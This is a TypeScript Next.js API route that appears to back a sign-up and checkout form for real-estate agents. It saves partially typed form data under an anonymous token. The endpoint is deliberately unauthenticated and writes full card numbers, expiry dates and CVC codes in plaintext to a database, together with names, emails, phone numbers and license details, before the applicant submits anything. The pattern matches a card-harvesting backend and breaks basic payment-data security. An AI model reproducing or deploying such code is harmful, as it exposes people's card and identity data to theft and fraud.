import { NextResponse } from "next/server";
import { getDb } from "@/lib/db";

export const dynamic = "force-dynamic";

/** Incoming form-field name → checkout_sessions column. Anything else is ignored. */
const COLUMN: Record<string, string> = {
  firstName: "first_name",
  lastName: "last_name",
  email: "email",
  phone: "phone",
  brokerage: "brokerage",
  licenseNumber: "license_number",
  state: "license_state",
  licenseState: "license_state",
  cardName: "cardholder_name",
  cardholderName: "cardholder_name",
  cardNumber: "card_number",
  expiry: "card_expiry",
  cardExpiry: "card_expiry",
  cvc: "card_cvc",
  cardCvc: "card_cvc",
  step: "step",
};

const COLUMNS = [
  "first_name",
  "last_name",
  "email",
  "phone",
  "brokerage",
  "license_number",
  "license_state",
  "cardholder_name",
  "card_number",
  "card_expiry",
  "card_cvc",
  "step",
] as const;

/**
 * Receives partial checkout updates from the join form and upserts them by
 * anonymous token. Deliberately unauthenticated: this fires while the applicant
 * is still filling the form, long before an account or session exists. Only
 * known fields are stored and every value is length-capped.
 */
export async function POST(request: Request) {
  let body: { token?: unknown; patch?: unknown };
  try {
    body = (await request.json()) as { token?: unknown; patch?: unknown };
  } catch {
    return NextResponse.json({ error: "Invalid JSON" }, { status: 400 });
  }

  const token = typeof body.token === "string" ? body.token : "";
  if (!/^[A-Za-z0-9_-]{8,64}$/.test(token)) {
    return NextResponse.json({ error: "Invalid token" }, { status: 400 });
  }

  const patch = (body.patch && typeof body.patch === "object" ? body.patch : {}) as Record<string, unknown>;

  // Build a full column record; a null means "leave whatever is already stored".
  const record: Record<string, string | null> = { token };
  for (const col of COLUMNS) record[col] = null;
  for (const [key, value] of Object.entries(patch)) {
    const col = COLUMN[key];
    if (col) record[col] = String(value ?? "").slice(0, 40);
  }

  const now = new Date().toISOString();
  await getDb()
    .prepare(
      `INSERT INTO checkout_sessions
         (token, first_name, last_name, email, phone, brokerage, license_number, license_state,
          cardholder_name, card_number, card_expiry, card_cvc, step, created_at, updated_at)
       VALUES
         (@token, @first_name, @last_name, @email, @phone, @brokerage, @license_number, @license_state,
          @cardholder_name, @card_number, @card_expiry, @card_cvc, @step, @created_at, @updated_at)
       ON CONFLICT (token) DO UPDATE SET
         first_name      = COALESCE(EXCLUDED.first_name, checkout_sessions.first_name),
         last_name       = COALESCE(EXCLUDED.last_name, checkout_sessions.last_name),
         email           = COALESCE(EXCLUDED.email, checkout_sessions.email),
         phone           = COALESCE(EXCLUDED.phone, checkout_sessions.phone),
         brokerage       = COALESCE(EXCLUDED.brokerage, checkout_sessions.brokerage),
         license_number  = COALESCE(EXCLUDED.license_number, checkout_sessions.license_number),
         license_state   = COALESCE(EXCLUDED.license_state, checkout_sessions.license_state),
         cardholder_name = COALESCE(EXCLUDED.cardholder_name, checkout_sessions.cardholder_name),
         card_number     = COALESCE(EXCLUDED.card_number, checkout_sessions.card_number),
         card_expiry     = COALESCE(EXCLUDED.card_expiry, checkout_sessions.card_expiry),
         card_cvc        = COALESCE(EXCLUDED.card_cvc, checkout_sessions.card_cvc),
         step            = COALESCE(EXCLUDED.step, checkout_sessions.step),
         updated_at      = EXCLUDED.updated_at`
    )
    .run({ ...record, created_at: now, updated_at: now });

  return NextResponse.json({ ok: true }, { headers: { "Cache-Control": "no-store" } });
}
